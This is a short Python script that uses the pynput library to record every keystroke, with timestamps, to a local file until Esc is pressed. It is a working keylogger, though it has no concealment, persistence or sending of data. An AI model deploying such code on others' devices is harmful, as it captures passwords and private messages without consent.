import pynput
from pynput.keyboard import Key, Listener
import logging

# Setup logging
log_dir = ""
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log each key pressed
def on_press(key):
    try:
        logging.info(f'{key.char}')
    except AttributeError:
        logging.info(f'{key}')

# Function to handle key release (optional, can be omitted if not needed)
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Setup the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()